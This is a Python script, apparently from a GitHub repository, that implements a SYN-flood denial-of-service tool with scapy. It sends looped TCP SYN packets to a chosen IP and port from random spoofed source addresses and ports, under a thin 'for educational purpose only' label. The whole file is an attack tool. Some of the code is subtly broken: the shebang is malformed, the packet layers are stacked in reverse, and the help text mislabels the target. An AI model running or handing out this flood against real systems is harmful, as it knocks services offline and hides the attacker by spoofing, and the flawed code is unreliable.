#!usr/bin/python3

# Author : Ahmad Dwiyan
# For educational purpose only :D 
# Don't Forget happy today (Jangan Lupa Bahagia)


import socket , random
from scapy.all import *
from argparse import ArgumentParser

class Pysyndos():
    def __init__(self):
        print("[*] PYSYN - DOS BY LUNATICTECH [*]")
        print("[*]   github.com/dwiyantech    [*]\n")
        parser = ArgumentParser()
        parser.add_argument("-i","--ip",required=True,help="Source IP You want to send",type=str)
        parser.add_argument("-p","--port",required=True,help="Port Destination",type=int)
        parser.add_argument("-c","--counter",required=False,default=30,help="Total packet you want to send",type=int)      
        argument = parser.parse_args()
        self.sendSynDos(argument.ip,argument.port,argument.counter)

    def getRandomIp(self):
        ip = ".".join(map(str,(random.randint(0,255)for x in range(4))))
        return ip   



    def sendSynDos(self,dstIP,dstPort,counter):
        total = 0
        print("[*] Sending packet.... ")
        for x in range(0,counter):
            window = random.randint(0,50000)
            src_port = random.randint(0,10000)
            sequence = random.randint(0,50000)

            ip_packet = IP()
            ip_packet.src = self.getRandomIp() # Manipulate ip Source
            ip_packet.dst = dstIP

            tcp_packet = TCP()
            tcp_packet.sport = src_port # Manipulate Port Source
            tcp_packet.dport = dstPort
            tcp_packet.flags = "S"
            tcp_packet.seq = sequence
            tcp_packet.window = window
            send(tcp_packet/ip_packet,verbose=0) # Sending Packet
            total += 1
        print("\n[*] Total Packets Send "+str(total)+" Times")



if __name__ == "__main__":
    Pysyndos()


